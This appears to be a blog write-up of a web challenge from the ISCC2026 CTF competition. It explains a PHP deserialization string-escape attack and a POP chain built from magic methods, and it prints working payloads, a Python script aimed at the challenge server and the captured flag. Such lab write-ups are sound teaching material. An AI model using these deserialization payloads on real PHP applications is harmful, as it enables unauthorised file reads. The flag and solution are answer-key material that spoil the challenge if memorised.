+++
title = "数字古墓"
date = "2026-05-14"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++

Web + 数字古墓

解题思路：

这道题分为两个阶段，两个页面都会直接显示 PHP 源码，因此整体思路就是审计代码并构造对应利用。第一阶段入口是 \`/rune_trial.php\`，第二阶段入口是 \`/mechanism_chamber.php\`，最终需要先在第一阶段拿到第二阶段要读取的文件名，再在第二阶段通过反序列化利用链读出 flag。

第一阶段的核心在于服务端会先将对象序列化，再对序列化结果执行字符串替换，最后再反序列化。函数中会把 \`amgoinvc\` 替换成更短的 \`iscc\`，这就导致序列化串中的长度信息与真实内容不一致，从而形成典型的 PHP 反序列化字符串逃逸。构造时将多个 \`amgoinvc\` 放入参数 \`d\` 中，使替换后整体长度缩短，再在参数 \`p\` 中伪造后续字段内容，把对象的 \`y\` 属性覆盖为 \`admin123\`。这样在反序列化后会触发 \`__wakeup()\`，满足条件后包含 \`relic_manifest.php\`，最终回显出第二阶段需要访问的文件名 \`W3f82KD9.txt\`。

第二阶段的核心是基于源码中的几个类拼接 POP 链。最外层从 \`GateSentinel\` 开始，在其 \`__wakeup()\` 中会对 \`\$this-&gt;object\` 执行正则匹配；如果这里传入的不是字符串而是对象，就会触发该对象的 \`__toString()\`。内层 \`GateSentinel::__toString()\` 会继续访问 \`\$this-&gt;tool['blade']-&gt;object\`，从而触发 \`Keystone::__get()\`；而 \`Keystone\` 的 \`center\` 属性可控，只要放入一个可调用对象 \`RitualEngine\`，就会继续执行其 \`__invoke()\`。在 \`RitualEngine::__invoke()\` 中，程序会反序列化自身的 \`callback\`，取出数组中的对象和方法名，并将方法名 \`view\` 映射为 \`run()\` 执行。最后只要把 \`RitualEngine\` 的 \`target\` 设置为第一阶段得到的合法文件名 \`W3f82KD9.txt\`，就可以通过 \`run()\` 成功读取文件内容并拿到 flag。

本题的关键在于两段利用链的衔接：第一阶段通过字符串替换逃逸伪造属性值，拿到文件名；第二阶段再围绕 \`__wakeup -&gt; __toString -&gt; __get -&gt; __invoke -&gt; run\` 构造完整 POP 链，最终读取目标文件。

Exp：

```text

第一阶段：

/rune_trial.php?d=amgoinvcamgoinvcamgoinvcamgoinvc&p=%22%3Bs%3A1%3A%22y%22%3Bs%3A8%3A%22admin123%22%3B%7D

```

```text

第二阶段 payload：

O:12:"GateSentinel":2:{s:6:"object";O:12:"GateSentinel":2:{s:6:"object";s:10:"start.html";s:4:"tool";a:1:{s:5:"blade";O:8:"Keystone":1:{s:6:"center";O:12:"RitualEngine":1:{s:8:"callback";s:82:"a:2:{i:0;O:12:"RitualEngine":1:{s:6:"target";s:12:"W3f82KD9.txt";}i:1;s:4:"view";}";}}}}s:4:"tool";N;}

```

```python

import requests

url = "http://39.105.213.28:10026/mechanism_chamber.php"

data = {

"data": 'O:12:"GateSentinel":2:{s:6:"object";O:12:"GateSentinel":2:{s:6:"object";s:10:"start.html";s:4:"tool";a:1:{s:5:"blade";O:8:"Keystone":1:{s:6:"center";O:12:"RitualEngine":1:{s:8:"callback";s:82:"a:2:{i:0;O:12:"RitualEngine":1:{s:6:"target";s:12:"W3f82KD9.txt";}i:1;s:4:"view";}";}}}}s:4:"tool";N;}'

}

r = requests.post(url, data=data)

print(r.text)

```

Flag：

\`ISCC{ankh_rune_sigma_47x_decrypted}\`
